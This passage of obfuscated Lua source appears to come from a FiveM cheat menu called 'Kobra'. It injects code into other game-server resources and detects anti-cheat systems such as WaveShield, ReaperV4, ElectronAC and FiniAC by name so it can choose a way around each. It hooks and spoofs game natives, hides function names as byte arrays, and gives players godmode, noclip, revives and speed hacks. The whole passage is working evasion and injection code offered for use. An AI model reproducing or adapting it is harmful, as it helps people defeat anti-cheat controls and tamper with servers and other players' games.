                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);end break;end end end,["mc9-medicsystem"]=function() local v786=0 -0 ;local v787;local v788;while true do if (v786==(231 -(19 + 211))) then v788=GetResourceState("ReaperV4")=="started" ;if v787 then MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);elseif v788 then MachoInjectThread(0,"mc9-medicsystem","",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);else MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);end break;end if (v786==(113 -(88 + 25))) then print("1");v787=GetResourceState("WaveShield")=="started" ;v786=2 -1 ;end end end};for v789,v790 in pairs(v359) do if (GetResourceState(v789)=="started") then v790();end end break;end end end},{type="slider",label="Health",desc="This will set your health to the desired amount.",scrollType="onEnter",value=100,min=0 + 0 ,max=1136 -(1007 + 29) ,step=1 + 0 ,onSelect=function(v360) SetEntityHealth(PlayerPedId(),v360 + 100 );end},{type="slider",label="Armour",desc="This will set your armour to the desired amount.",scrollType="onEnter",value=472 -372 ,min=0,max=100,step=1,onSelect=function(v361) SetPedArmour(PlayerPedId(),v361);end},{type="button",label="Refill Health",desc="This will refill your health to the maximum value.",onSelect=function() SetEntityHealth(PlayerPedId(),GetEntityMaxHealth(PlayerPedId()));end},{type="button",label="Refill Armour",desc="This will refill your armour to the maximum value.",onSelect=function() SetPedArmour(PlayerPedId(),251 -151 );end},{type="checkbox",label="Godmode",checked=false,desc="This will give your player godmode.",onSelect=function(v362) v281:HandleGodmodeToggle(v362);end},{type="checkbox",label="Invisibility",checked=false,desc="This will make your player invisible.",onSelect=function(v363) if v363 then v281:EnableInvisibility();else v281:DisableInvisibility();end end},{type="divider",label="Movement"},{type="slider-checkbox",label="Noclip",scrollType="onScroll",checked=false,value=0.25 + 0 ,step=1972.25 -(495 + 1477) ,min=0.25,max=14 -9 ,onSelect=function(v364,v365) if v365 then if  not v29 then v12:Notify("info","Kobra","Initializing... Please wait!",656 + 344 );Wait(803 -(342 + 61) );v29=true;end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                _G.KobraNoclipSpeed = ]]   .. v364   .. [[
                                if not _G.KobraNoclipThreadRunning then
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.KobraNoclipThreadRunning do
                                            Wait(0)
                                            if not _G.KobraNoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.KobraNoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipSpeed = ]]   .. v364   .. [[
                                end
                            ]] );elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(2 + 1 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v364   .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.KobraNoclipSpeed or ]]   .. v364   .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v364   .. [[
                                            end
                                        ]] );else MachoInjectResource2(168 -(4 + 161) ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipSpeed = ]]   .. v364   .. [[
                                            if not _G.KobraNoclipThreadRunning then
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.KobraNoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.KobraNoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.KobraNoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipSpeed = ]]   .. v364   .. [[
                                            end
                                        ]] );end elseif (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                    _G.KobraNoclipEnabled = false
                                    _G.KobraNoclipThreadRunning = false
                                ]]);elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(3,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipEnabled = false
                                            _G.KobraNoclipThreadRunning = false
                                        ]]);end end},{type="slider-checkbox",label="Freecam",scrollType="onScroll",checked=false,value=0.25,step=0.25,min=0.25 -0 ,max=13 -8 ,onSelect=function(v366,v367) v281:ToggleFreecam(v367,v366);end},{type="checkbox",label="Fast Run",checked=false,onSelect=function(v368) if v368 then local v593=563 -(173 + 390) ;while true do if (v593==(0 + 0)) then v12:Notify("success","Kobra","Fast Run On",3314 -(203 + 111) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]);end break;end end else local v594=0 + 0 ;while true do if (v594==0) then v12:Notify("error","Kobra","Fast Run Off",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]]);end break;end end end end},{type="checkbox",label="Super Jump",checked=false,onSelect=function(v369) local v370=0 -0 ;local v371;local v372;local v373;local v374;local v375;while true do if (v370==4) then function v375() _G.superJumpEnabled=false;v373({789 -(57 + 649) ,101,116,8 + 75 ,393 -276 ,112,101,1150 -(562 + 474) ,172 -98 ,1022 -(76 + 829) ,109,112,157 -73 ,62 + 42 ,61 + 44 ,452 -(258 + 79) ,70,1584 -(1219 + 251) ,155 -(34 + 24) ,203 -94 ,101})(v373({256 -176 ,108,97,1710 -(877 + 712) ,101,868 -(242 + 512) ,152 -79 ,100})(),628 -(92 + 535) );end if v369 then if v371 then v374();else MachoInjectResourceRaw("any",[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]]);end elseif v371 then local v1034=0 + 0 ;while true do if (v1034==(0 -0)) then print("off");v375();break;end end else MachoInjectResourceRaw("any",[[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]]);end break;end if (v370==(0 + 0)) then v371=GetResourceState("WaveShield")=="started" ;v372=nil;v370=3 -2 ;end if (v370==(3 + 0)) then function v374() if  not _G.superJumpEnabled then _G.superJumpEnabled=true;v373({10 + 57 ,173 -59 ,101,97,1400 -(299 + 985) ,101,275 -191 ,197 -(86 + 7) ,11 + 103 ,44 + 57 ,229 -(14 + 118) ,80 + 20 })(function() while _G.superJumpEnabled do v373({1478 -(440 + 955) ,181 -80 ,288 -172 ,436 -(260 + 93) ,267 -150 ,2086 -(1181 + 793) ,408 -(105 + 202) ,924 -(352 + 458) ,74,298 -181 ,106 + 3 ,112,84,1172 -(728 + 340) ,321 -216 ,115,199 -129 ,35 + 79 ,442 -(124 + 221) ,560 -(115 + 336) ,222 -121 })(v373({126 -(45 + 1) ,2098 -(1282 + 708) ,1309 -(583 + 629) ,21 + 100 ,53 + 48 ,114,73,1731 -(1539 + 92) })());Wait(0);end end);end end v375=nil;v370=1950 -(706 + 1240) ;end if (1==v370) then function v372(v791) local v792=258 -(81 + 177) ;local v793;while true do if (v792==(2 -1)) then return v793;end if (v792==0) then v793="";for v1130=258 -(212 + 45) , #v791 do v793=v793   .. string.char(v791[v1130]) ;end v792=3 -2 ;end end end v373=nil;v370=1948 -(708 + 1238) ;end if (2==v370) then function v373(v794) return _G[v372(v794)];end v374=nil;v370=1 + 2 ;end end end}}},{label="Miscellaneous",tabs={{icon="",type="button",label="Crash Game",desc="Crashes your game",onSelect=function() MachoInjectResourceRaw("any",[[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]]);end},{icon="",type="button",label="Clear Screen Effects",desc="Removes all screen effects",onSelect=function() print("Revive");end},{icon="",type="button",label="Suicide",desc="This will kill you.",onSelect=function() local function v376() local v545=SetEntityHealth;v545(PlayerPedId(),280 -(215 + 65) );end v376();end},{icon="",type="button",label="Force Ragdoll",desc="This will ragdoll.",onSelect=function() MachoInjectResourceRaw("any",[[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]]);end},{icon="",type="button",label="Remove Crutch",desc="Remove Crutch is the server is using the correct resource",onSelect=function() MachoResourceStop("wasabi_crutch");end},{icon="",type="scrollable",value=1 + 0 ,values={"Primary","Secondary"},label="Clear Tasks",desc="Clears the character's tasks",onSelect=function(v377) if (v377=="Primary") then ClearPedTasksImmediately(PlayerPedId());elseif (v377=="Secondary") then ClearPedSecondaryTask(PlayerPedId());end end},{type="divider",label="Toggles"},{type="checkbox",label="No Ragdoll",checked=false,desc="This will prevent you from being ragdolled from admins or cheaters.",onSelect=function(v378) local v379=GetResourceState("WaveShield")=="started" ;local v380=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v378 then if v379 then local v795=0;while true do if (v795==(0 + 0)) then v12:Notify("success","Kobra","No Ragdoll Enabled",1657 + 1343 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]]);break;end end else local v796=0;while true do if (v796==(1280 -(883 + 397))) then v48(v380,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
